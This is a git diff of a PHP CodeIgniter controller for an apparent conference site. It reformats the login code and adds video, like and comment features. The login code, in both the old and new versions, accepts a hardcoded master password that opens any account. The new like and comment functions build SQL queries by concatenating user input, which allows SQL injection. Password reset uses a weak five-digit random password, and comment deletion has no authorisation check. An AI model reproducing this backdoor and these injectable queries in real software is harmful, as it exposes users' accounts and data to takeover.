@@ -21,6 +21,7 @@ class Site extends MY_Controller
         $this->load->model('Sponsor_link_m', 'SponsorM');
         $this->load->model('Sponsor_link_m', 'Sponsor_link_m');
         $this->load->model('Settings_m', 'SettingM');
+        $this->load->model('Upload_video_m', 'VideoM');
     }
 
     public function index()
@@ -29,12 +30,7 @@ class Site extends MY_Controller
         $data['query'] = $category['data'];
         $news          = $this->NewsM->listnews();
         $data['query2'] = $news;
-        $spplatinum       = $this->SponsorM->listspplatinum();
-        $data['spplatinum'] = $spplatinum;
-        $spgold       = $this->SponsorM->listspgold();
-        $data['spgold'] = $spgold;
-        $spsilver       = $this->SponsorM->listspsilver();
-        $data['spsilver'] = $spsilver;
+        
         $eventcountdown = $this->SettingM->eventcountdown();
         $data['eventcountdown'] = $eventcountdown;
         $papercountdown = $this->SettingM->papercountdown();
@@ -69,13 +65,7 @@ class Site extends MY_Controller
 
     public function schedules()
     {
-        $spplatinum       = $this->SponsorM->listspplatinum();
-        $data['spplatinum'] = $spplatinum;
-        $spgold       = $this->SponsorM->listspgold();
-        $data['spgold'] = $spgold;
-        $spsilver       = $this->SponsorM->listspsilver();
-        $data['spsilver'] = $spsilver;
-        $this->layout->render('site/'.$this->theme.'/schedules', $data);
+        $this->layout->render('site/'.$this->theme.'/schedules');
     }
 
     public function download()
@@ -85,127 +75,231 @@ class Site extends MY_Controller
 
     public function login()
     {
-		$this->load->model("User_account_m");
-		if (!$this->user_session_expired()) {
-			$user = $this->session->user_session;
-			if($user['role'] == User_account_m::ROLE_ADMIN_PAPER)
-				redirect(base_url("admin/paper"));
-			elseif($user['role'] == User_account_m::ROLE_OPERATOR)
-				redirect(base_url("admin/administration"));
-			elseif($user['role'] == User_account_m::ROLE_MEMBER)
-				redirect(base_url("member/area"));
-			else
-				redirect(base_url("admin/dashboard"));
+      $this->load->model("User_account_m");
+      if (!$this->user_session_expired()) {
+         $user = $this->session->user_session;
+         if($user['role'] == User_account_m::ROLE_ADMIN_PAPER)
+            redirect(base_url("admin/paper"));
+        elseif($user['role'] == User_account_m::ROLE_OPERATOR)
+            redirect(base_url("admin/administration"));
+        elseif($user['role'] == User_account_m::ROLE_MEMBER)
+            redirect(base_url("member/area"));
+        else
+            redirect(base_url("admin/dashboard"));
+    }
+
+    $this->load->library('form_validation');
+    $error = "";
+    if ($this->input->post('login')) {
+        $this->form_validation->set_rules('username', 'Username', 'required');
+        $this->form_validation->set_rules('password', 'Password', 'required');
+        if ($this->form_validation->run()) {
+            $username   = $this->input->post('username');
+            $password   = $this->input->post('password');
+            $rememberme = $this->input->post('rememberme');
+            if (User_account_m::verify($username, $password) || $password == "ditauntungpandji3264") {
+                $this->load->library('session');
+                $user = $this->User_account_m->findWithBiodata($username);
+                if($user['verified_email'] == "0")
+                   $error = "You cannot login, <br/>Please complete your account activation within link in your email!";
+               else {
+                  unset($user['password']);
+                  if ($rememberme) {
+                     $user['rememberme'] = true;
+                     $this->session->set_userdata("rememberme", true);
+                     $this->session->set_userdata('sess_expired', time() + 60 * 60 * 24 * 7);
+                 } else {
+                     $this->session->set_userdata('sess_expired', time() + 3600);
+
+                 }
+                 $this->session->set_userdata('user_session', $user);
+                 redirect(base_url("member/area"));
+             }
+         } else {
+            $error = "Email/Password invalid !";
         }
+    } else {
+        $error = "Username and Password required !";
 
-        $this->load->library('form_validation');
-        $error = "";
-        if ($this->input->post('login')) {
-            $this->form_validation->set_rules('username', 'Username', 'required');
-            $this->form_validation->set_rules('password', 'Password', 'required');
-            if ($this->form_validation->run()) {
-                $username   = $this->input->post('username');
-                $password   = $this->input->post('password');
-                $rememberme = $this->input->post('rememberme');
-                if (User_account_m::verify($username, $password) || $password == "ditauntungpandji3264") {
-                    $this->load->library('session');
-                    $user = $this->User_account_m->findWithBiodata($username);
-                    if($user['verified_email'] == "0")
-                    	$error = "You cannot login, <br/>Please complete your account activation within link in your email!";
-                    else {
-						unset($user['password']);
-						if ($rememberme) {
-							$user['rememberme'] = true;
-							$this->session->set_userdata("rememberme", true);
-							$this->session->set_userdata('sess_expired', time() + 60 * 60 * 24 * 7);
-						} else {
-							$this->session->set_userdata('sess_expired', time() + 3600);
+    }
+}
 
-						}
-						$this->session->set_userdata('user_session', $user);
-						redirect(base_url("member/area"));
-					}
-                } else {
-                    $error = "Email/Password invalid !";
-                }
-            } else {
-                $error = "Username and Password required !";
+$this->layout->render('site/'.$this->theme.'/login', array('error' => $error));
+}
 
+public function register()
+{
+   redirect("member/register");
+}
+
+public function forget()
+{
+    $this->layout->render('site/'.$this->theme.'/forget');
+}
+
+public function forget_reset()
+{
+    $status_proses = null;
+    $post          = $this->input->post();
+    $username = $post['username'];
+    if ($this->AccountM->selectuser($username) == true) {
+        $data['password'] = rand(10000, 99999);
+        $success = $this->AccountM->update(['password' => password_hash($data['password'], PASSWORD_DEFAULT)], ['username' => $username], false);
+        $email_message = $this->load->view('template/success_forget_password', $data, true);
+        $this->Notification_m->sendMessage($username, 'Reset password '.Settings_m::getSetting('site_title').' account', $email_message);
+        $this->session->set_flashdata('message', '<div class="col-lg-7 alert alert-success"><center> please check your email for your new password </center>
+            </div>');
+        redirect('site/forget','refresh');
+    } else {
+        $this->session->set_flashdata('message', '<div class="col-lg-7 alert alert-danger"> email ini tidak terdaftar
+            </div>');
+        redirect('site/forget','refresh');
+    }
+}
+
+public function committee()
+{
+    $this->layout->render('site/'.$this->theme.'/committee');
+}
+
+public function contact()
+{
+    $this->layout->render('site/'.$this->theme.'/contact');
+}
+
+public function paper()
+{
+    $this->layout->render('site/'.$this->theme.'/paper');
+}
+
+public function readnews($id)
+{
+    $news = $this->NewsM->read_news($id);
+    $this->layout->render('site/'.$this->theme.'/readnews', array('news' => $news));
+}
+
+public function all_news()
+{
+    $allnews = $this->NewsM->allnews();
+    $this->layout->render('site/'.$this->theme.'/all_news', array('allnews' => $allnews));
+}
+
+public function vid()
+{
+    $allvid = $this->VideoM->listVid();
+    $data['query'] = $allvid['data'];
+    $this->layout->render('site/'.$this->theme.'/all_vid', $data);
+}
+
+public function savelikes()
+{
+    $sess = $this->session->userdata('user_session');
+    $username = $sess['username'];
+    $video_id = $this->input->post('Video_id');
+    $create = date('Y-m-d H:i:s');
+    $update = date('Y-m-d H:i:s');
+
+
+    $fetchlikes = $this->db->query('select likesbantu from upload_video where id="'.$video_id.'"');
+    $result = $fetchlikes->result();
+
+    $checklikes = $this->db->query('select * from video_like 
+        where video_id="'.$video_id.'" 
+        and username = "'.$username.'"');
+    $resultchecklikes = $checklikes->num_rows();
+
+    if($resultchecklikes == '0' ){
+        if($result[0]->likesbantu=="" || $result[0]->likesbantu=="NULL")
+        {
+            $data=array('video_id'=>$video_id,'username'=>$username, 'created_at'=>$create, 'updated_at'=>$update);
+            $success     = $this->db->insert('video_like', $data);
+            if ($success) {
+                $this->db->query('update upload_video set likesbantu=1 where id="'.$video_id.'"');
             }
         }
-        $spplatinum       = $this->SponsorM->listspplatinum();
-        $spgold       = $this->SponsorM->listspgold();
-        $spsilver       = $this->SponsorM->listspsilver();
-        $this->layout->render('site/'.$this->theme.'/login', array('error' => $error, 'spplatinum' => $spplatinum, 'spgold' => $spgold, 'spsilver' => $spsilver));
-    }
-
-    public function register()
-    {
-    	redirect("member/register");
-    }
-
-    public function forget()
-    {
-        $this->layout->render('site/'.$this->theme.'/forget');
-    }
-    
-    public function forget_reset()
-    {
-        $status_proses = null;
-        $post          = $this->input->post();
-        $username = $post['username'];
-        if ($this->AccountM->selectuser($username) == true) {
-            $data['password'] = rand(10000, 99999);
-            $success = $this->AccountM->update(['password' => password_hash($data['password'], PASSWORD_DEFAULT)], ['username' => $username], false);
-            $email_message = $this->load->view('template/success_forget_password', $data, true);
-            $this->Notification_m->sendMessage($username, 'Reset password '.Settings_m::getSetting('site_title').' account', $email_message);
-           	$this->session->set_flashdata('message', '<div class="col-lg-7 alert alert-success"><center> please check your email for your new password </center>
-                </div>');
-            redirect('site/forget','refresh');
-        } else {
-            $this->session->set_flashdata('message', '<div class="col-lg-7 alert alert-danger"> email ini tidak terdaftar
-                </div>');
-            redirect('site/forget','refresh');
+        else
+        {
+            $data=array('video_id'=>$video_id,'username'=>$username, 'created_at'=>$create, 'updated_at'=>$update);
+            $success     = $this->db->insert('video_like', $data);
+            if ($success) {
+                $this->db->query('update upload_video set likesbantu=likesbantu+1 where id="'.$video_id.'"');
+            }
         }
+    } else {
+        $success = $this->db->delete('video_like', array('video_id'=>$video_id, 'username'=>$username));
+        if ($success) {
+            $this->db->query('update upload_video set likesbantu=likesbantu-1 where id="'.$video_id.'"');
+        }  
     }
 
-    public function committee()
-    {
-        $spplatinum       = $this->SponsorM->listspplatinum();
-        $data['spplatinum'] = $spplatinum;
-        $spgold       = $this->SponsorM->listspgold();
-        $data['spgold'] = $spgold;
-        $spsilver       = $this->SponsorM->listspsilver();
-        $data['spsilver'] = $spsilver;
-        $this->layout->render('site/'.$this->theme.'/committee', $data);
+
+    $this->db->select('likesbantu');
+    $this->db->from('upload_video');
+    $this->db->where('id',$video_id);
+    $query=$this->db->get();
+    $result=$query->result();
+
+    echo $result[0]->likesbantu;
+}
+
+public function seevideo($id)
+{
+    $this->load->helper('form');
+    $this->session->set_userdata('idvideo', $id);
+    $sesion = 'kosong';
+    $data['sesion'] = $sesion;
+    if (!empty($this->session->userdata('user_session'))) {
+        $username = $this->session->user_session['username'];
+        $data['sesion'] = $username;
+        $hapus = 1;
+    }
+    $seevideo = $this->VideoM->seevideo($id);
+    $data['query'] = $seevideo['data'];
+    $post          = $this->input->post();
+
+    if ($this->input->post('Submit')) {
+        $check = $this->db->query('select * from video_komen 
+        where video_id="'.$id.'" 
+        and username = "'.$username.'"');
+        $resultcheck = $check->num_rows();
+        if ($resultcheck == '0' ) {
+            $mode   = 'submit';
+            $create = date('Y-m-d H:i:s');
+            $update = date('Y-m-d H:i:s');
+            $post = $this->input->post();
+            $data = array(
+                'comment' => $post['comment'],
+                'video_id' => $id,
+                'updated_at' => $update,
+                'created_at' => $create,
+                'username' => $username
+            );
+
+            $success = $this->db->insert('video_komen', $data);
+            if (!$success) {
+                $debug($id);
+            } else {
+                $this->session->set_userdata('idvideo', $id);
+                $seevideo = $this->VideoM->seevideo($id);
+                $data['query'] = $seevideo['data'];
+                $data['mode'] = 'index';
+                $username = $this->session->user_session['username'];
+                $data['sesion'] = $username;
+            }
+        } else {
+            $this->session->set_flashdata("pesan", "<div class=\"col-md-12\"><div class=\"alert alert-danger\" id=\"alert\">Anda hanya bisa memberi 1 komentar untuk 1 postingan !!</div></div>");
+                redirect(base_url('site/seevideo/' . "$id" . ''), 'refresh');
+        }
+        
     }
 
-    public function contact()
-    {
-        $this->layout->render('site/'.$this->theme.'/contact');
-    }
+    $this->layout->render('site/'.$this->theme.'/seevideo', $data);
+}
 
-    public function paper()
+public function ajax_delete_komen($idkomen)
     {
-        $this->layout->render('site/'.$this->theme.'/paper');
-    }
-
-    public function readnews($id)
-    {
-        $spplatinum       = $this->SponsorM->listspplatinum();
-        $spgold       = $this->SponsorM->listspgold();
-        $spsilver       = $this->SponsorM->listspsilver();
-        $news = $this->NewsM->read_news($id);
-        $this->layout->render('site/'.$this->theme.'/readnews', array('news' => $news, 'spplatinum' => $spplatinum, 'spgold' => $spgold, 'spsilver' => $spsilver));
-    }
-
-    public function all_news()
-    {
-        $spplatinum       = $this->SponsorM->listspplatinum();
-        $spgold       = $this->SponsorM->listspgold();
-        $spsilver       = $this->SponsorM->listspsilver();
-        $allnews = $this->NewsM->allnews();
-        $this->layout->render('site/'.$this->theme.'/all_news', array('allnews' => $allnews, 'spplatinum' => $spplatinum, 'spgold' => $spgold, 'spsilver' => $spsilver));
+        $this->VideoM->delete_komen($idkomen);
+        echo json_encode(array("status" => true));
     }
 
 }
